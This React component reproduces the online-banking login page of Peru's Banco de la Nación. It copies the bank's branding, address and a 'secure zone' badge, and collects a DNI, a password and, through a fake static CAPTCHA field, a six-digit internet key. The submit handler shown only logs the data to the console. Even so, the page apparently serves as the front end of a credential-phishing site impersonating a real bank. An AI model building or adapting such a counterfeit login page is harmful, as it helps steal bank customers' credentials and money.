'use client'

import React, { useState } from 'react'
import styles from './banca-login.module.css'

export default function BancaLogin() {
  const [formData, setFormData] = useState({
    accountType: 'DNI',
    dni: '',
    clave: ''
  })

  const numpadButtons = ['5', '9', '2', '6', '3', '1', '4', '8', '7', '0']
  const [selectedNumpad, setSelectedNumpad] = useState<string | null>(null)

  const handleNumpadClick = (num: string) => {
    setFormData(prev => ({
      ...prev,
      clave: (prev.clave + num).slice(0, 10)
    }))
  }

  const handleClear = () => {
    setFormData(prev => ({
      ...prev,
      dni: ''
    }))
  }

  const handleClaveClear = () => {
    setFormData(prev => ({
      ...prev,
      clave: ''
    }))
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    // Handle login
    console.log('Login attempt:', formData)
  }

  return (
    <div className={styles.bancaContainer}>
      {/* Header */}
      <header className={styles.header}>
        <div className={styles.headerContent}>
          <div className={styles.headerLeft}>
            <div className={styles.multiRedBrand}>
              <span className={styles.multiRedText}>multi</span>
              <span className={styles.redText}>Red</span>
              <span className={styles.virtualText}>Virtual</span>
            </div>
          </div>
          <div className={styles.headerRight}>
            <img src="/image/logoBN.png" alt="Banco de la Nación" className={styles.bnLogo} />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className={styles.mainContent}>
        <div className={styles.securityBadge}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
          <span>Usted se encuentra en una <strong>zona segura</strong></span>
        </div>

        <div className={styles.formContainer}>
          <form onSubmit={handleSubmit} className={styles.loginForm}>
            {/* Account Type Selection */}
            <div className={styles.formGroup}>
              <label htmlFor="accountType">Seleccione</label>
              <div className={styles.selectWrapper}>
                <select 
                  id="accountType"
                  value={formData.accountType}
                  onChange={(e) => setFormData({...formData, accountType: e.target.value})}
                >
                  <option>DNI (Cuenta Corriente)</option>
                  <option>RUC</option>
                  <option>PASAPORTE</option>
                </select>
              </div>
            </div>

            {/* DNI Input */}
            <div className={styles.formGroup}>
              <label htmlFor="dni">DNI</label>
              <div className={styles.dniInputGroup}>
                <input
                  id="dni"
                  type="text"
                  value={formData.dni}
                  onChange={(e) => setFormData({...formData, dni: e.target.value.slice(0, 8)})}
                  placeholder="Ingresa tu número de DNI"
                  maxLength={8}
                />
                <button type="button" onClick={handleClear} className={styles.clearBtn}>LIMPIAR</button>
              </div>
            </div>

            {/* Clave Input with Virtual Numpad */}
            <div className={styles.claveSection}>
              <div className={styles.claveLabel}>Ingresa tu clave usando el teclado virtual del tecleado</div>
              <div className={styles.numpad}>
                {numpadButtons.map(num => (
                  <button
                    key={num}
                    type="button"
                    className={styles.numpadBtn}
                    onClick={() => handleNumpadClick(num)}
                  >
                    {num}
                  </button>
                ))}
              </div>
              <div className={styles.claveInputGroup}>
                <input
                  type="password"
                  value={formData.clave}
                  onChange={(e) => setFormData({...formData, clave: e.target.value.slice(0, 10)})}
                  placeholder="Ingresa tu clave"
                  maxLength={10}
                  className={styles.claveInput}
                />
                <button type="button" onClick={handleClaveClear} className={styles.clearClaveBtn}>LIMPIAR</button>
              </div>
            </div>

            {/* CAPTCHA Section */}
            <div className={styles.captchaSection}>
              <div className={styles.captchaLabel}>Ingresa el texto de la imagen</div>
              <div className={styles.captchaImage}>
                <span>4X/NS</span>
              </div>
              <input
                type="text"
                placeholder="Ingresa la Clave de Internet (06 dígitos)"
                className={styles.captchaInput}
              />
              <div className={styles.captchaLinks}>
                <a href="#" className={styles.captchaLink}><span className={styles.emoji}>😊</span> Genera tu Clave de Internet</a>
                <a href="#" className={styles.captchaLink}><span className={styles.emoji}>❌</span> Olvido-mi-clave</a>
                <a href="#" className={styles.captchaLink}><span className={styles.emoji}>🔄</span> Cambiar texto</a>
              </div>
            </div>

            {/* Submit Button */}
            <button type="submit" className={styles.submitBtn}>INGRESAR</button>

            {/* Security Recommendations */}
            <div className={styles.securityRec}>
              <a href="#">Recomendaciones de Seguridad</a>
            </div>
          </form>

          <div className={styles.formFooter}>
            <p>⚠️ Guía Cuenta de Ahorro ~ Guía Cuentas Corrientes</p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className={styles.footer}>
        <div className={styles.footerContent}>
          <p className={styles.footerTitle}>Banco de la Nación | Ministerio de Economía y Finanzas</p>
          <p className={styles.footerText}>Oficina Principal: Av. Javier Prado Este 2496, San Borja, Central Telefónica: 519 2000</p>
          <p className={styles.footerText}>Atención en Oficinas Administrativas: Lunes a Viernes de 06:30 a 17:30. Refrigerio de: 13:00-14:00.</p>
          <p className={styles.footerText}>Atención en Oficina de Trámite Documentario: Lunes a Viernes de 6:30 a 16:30 (horario corrido).</p>
        </div>
      </footer>
    </div>
  )
}
